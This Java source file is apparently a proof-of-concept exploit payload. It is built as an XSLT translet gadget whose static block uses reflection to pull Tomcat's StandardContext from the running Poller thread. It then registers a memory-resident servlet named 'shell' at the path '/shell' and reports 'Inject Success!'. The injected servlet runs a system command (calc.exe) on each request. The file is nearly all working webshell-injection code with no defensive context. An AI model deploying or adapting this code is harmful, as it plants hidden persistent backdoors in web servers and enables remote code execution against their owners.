package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class ServletEcho10 extends AbstractTranslet implements jakarta.servlet.Servlet {
    static {
        try {
            // 从线程中获取 StandardContext
            java.lang.reflect.Field f = null;
            Object threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getField(threadGroup, "threads");
            Thread thread = null;
            for (int i = 0; i < threads.length; i++) {
                if (threads[i].toString().contains("Poller")) {
                    thread = threads[i];
                    break;
                }
            }
            Object runnable = getField(thread, "target");
            Object nioEndpoint = getField(runnable, "this$0");
            f = nioEndpoint.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
            f.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) f.get(nioEndpoint);
            Object requestGroupInfo = getField(handler, "global");
            java.util.List processors = (java.util.List) getField(requestGroupInfo, "processors");
            org.apache.catalina.connector.Request request = null;
            for (int i = 0; i < processors.size(); i++) {
                Object requestInfo = processors.get(i);
                Object requestTmp = getField(requestInfo, "req");
                Object[] nodes = (Object[]) getField(requestTmp, "notes");
                for (int y = 0; y < nodes.length; y++) {
                    if (nodes[y] instanceof org.apache.catalina.connector.Request) {
                        request = (org.apache.catalina.connector.Request) nodes[y];
                        break;
                    }
                }
                if (request.getSession() != null) {
                    break;
                }
            }
            Object servletContext = request.getSession().getServletContext();
            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getField(getField(servletContext, "context"), "context");

            //创建 Servlet
            jakarta.servlet.Servlet servlet = new ServletEcho10();

            //将 Servlet 注入到 StandardContext
            String name = "shell";
            org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(name);
            wrapper.setServlet(servlet);
            wrapper.setLoadOnStartup(1);
            wrapper.setServletClass(servlet.getClass().getName());
            standardContext.addChild(wrapper);
            standardContext.addServletMappingDecoded("/shell",name);
            request.getResponse().getWriter().print("Inject Success!");
        } catch (Exception e) {}
    }

    static public Object getField(Object obj, String fName) throws Exception {
        java.lang.reflect.Field f = obj.getClass().getDeclaredField(fName);
        f.setAccessible(true);
        Object o = f.get(obj);
        return o;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers){}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {}
    @Override
    public void init(jakarta.servlet.ServletConfig servletConfig) {}
    @Override
    public jakarta.servlet.ServletConfig getServletConfig() { return null; }
    @Override
    public void service(jakarta.servlet.ServletRequest servletRequest, jakarta.servlet.ServletResponse servletResponse) throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
    @Override
    public String getServletInfo() {return null;}
    @Override
    public void destroy(){}


}
